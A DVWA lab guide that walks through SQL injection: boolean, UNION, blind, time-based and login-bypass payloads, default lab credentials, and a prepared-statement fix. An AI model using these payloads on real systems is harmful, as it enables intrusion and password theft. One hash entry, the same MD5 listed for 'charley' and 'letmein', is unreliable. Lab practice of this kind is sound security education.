# SQL Injection Guide (DVWA)

Educational guide for testing SQL injection on your local DVWA instance.

**Lab URL:** http://localhost/DVWA/vulnerabilities/sqli/  
**Login:** `admin` / `password`  
**Security level:** Set to **Low** at http://localhost/DVWA/security.php

---

## 1. What you already proved

You entered:

```text
1' OR '1'='1
```

The vulnerable query (Low level) looks like:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

Because `'1'='1'` is always true, **every row** in `users` is returned. That is classic **boolean-based** SQL injection.

---

## 2. Where the vulnerability lives

**File:** `vulnerabilities/sqli/source/low.php`

```php
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

User input is placed **inside the SQL string** with no parameterization. An attacker can break out of the quotes and add their own SQL.

---

## 3. DVWA objective (Low)

DVWA help says: steal passwords for all 5 users via SQLi.

The `users` table has (among others):

| Column        | Example        |
|---------------|----------------|
| `user_id`     | 1–5            |
| `first_name`  | admin          |
| `last_name`   | admin          |
| `password`    | (MD5 hash)     |

On **Low**, you only see `first_name` and `last_name` in the output — so you need **UNION** to pull `password`.

---

## 4. Union-based injection (steal passwords)

### Step 1 — Find number of columns

Try (one column at a time until no error):

```text
1' UNION SELECT null--
```

```text
1' UNION SELECT null,null--
```

Two columns work for this query (`first_name`, `last_name`).

### Step 2 — Union SELECT passwords

```text
1' UNION SELECT user, password FROM users--
```

Or with explicit column names:

```text
1' UNION SELECT first_name, password FROM users--
```

You should see usernames and MD5 password hashes for all users.

### Step 3 — Crack hashes (optional)

Hashes are MD5. Example tools: CrackStation, hashcat, or online MD5 crackers (lab only).

Known DVWA defaults (Low):

| User   | Password (plain) | MD5 hash (example)   |
|--------|------------------|----------------------|
| admin  | password         | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb| abc123           | e99a18c428cb38d5f260853678922e03 |
| 1337   | charley            | 0d107d09f5bbe40cade3de5a71dff9f2 |
| pablo  | letmein            | 0d107d09f5bbe40cade3de5a71dff9f2 |
| smithy | password           | 5f4dcc3b5aa765d61d8327deb882cf99 |

*(Hashes may match your DB reset; use what UNION returns.)*

---

## 5. Other useful payloads (Low)

| Goal              | Payload |
|-------------------|---------|
| All users (done)  | `1' OR '1'='1` |
| Single user       | `1` |
| Comment syntax    | `-- ` or `#` at end (space after `--` helps MySQL) |
| Error test        | `1'` (may show SQL error on Low) |
| Union placeholder | `1' UNION SELECT 1,2-- ` |

**Note:** DVWA often needs a trailing space after `--` because the next character in the query is not a newline.

---

## 6. Medium level (different technique)

**File:** `vulnerabilities/sqli/source/medium.php`

- Uses `mysqli_real_escape_string()` but **no quotes** around `$id`:

```sql
WHERE user_id = $id;
```

Escape does not stop numeric injection. Use **POST** form (dropdown replaced with Burp or change request):

```text
1 UNION SELECT user, password FROM users
```

(No quotes needed around the number.)

---

## 7. Blind SQL injection

**Module:** http://localhost/DVWA/vulnerabilities/sqli_blind/

You only get:

- `User ID exists in the database.`  
- `User ID is MISSING from the database.` (404)

**Boolean example:**

```text
1' AND '1'='1
```

→ exists

```text
1' AND '1'='2
```

→ missing

**Time-based example (MySQL):**

```text
1' AND SLEEP(5)--
```

If the page delays ~5 seconds, the injection worked.

Use blind techniques to extract data one bit at a time (or automate with sqlmap).

---

## 8. Login bypass (Brute Force module)

**URL:** http://localhost/DVWA/vulnerabilities/brute/

**Username:**

```text
admin' --
```

**Password:** anything

Builds:

```sql
SELECT * FROM users WHERE user = 'admin' --' AND password = '...';
```

Comment (`--`) ignores the password check.

---

## 9. Secure fix (Impossible level)

Use **prepared statements** — never concatenate user input into SQL:

```php
$stmt = mysqli_prepare($conn, "SELECT first_name, last_name FROM users WHERE user_id = ?");
mysqli_stmt_bind_param($stmt, "i", $id);
mysqli_stmt_execute($stmt);
```

See `vulnerabilities/sqli/source/impossible.php` and `secure_version.php` in this project.

---

## 10. References

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- DVWA in-app help: click **View Help** on each SQLi page
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command

---

## Quick checklist

- [ ] Security level = Low  
- [ ] Basic: `1' OR '1'='1` returns all users  
- [ ] Union: `1' UNION SELECT user, password FROM users-- `  
- [ ] Blind: `1' AND SLEEP(5)-- ` (time delay)  
- [ ] Brute Force login bypass: `admin' --`  
- [ ] Compare with **Impossible** level (should fail)
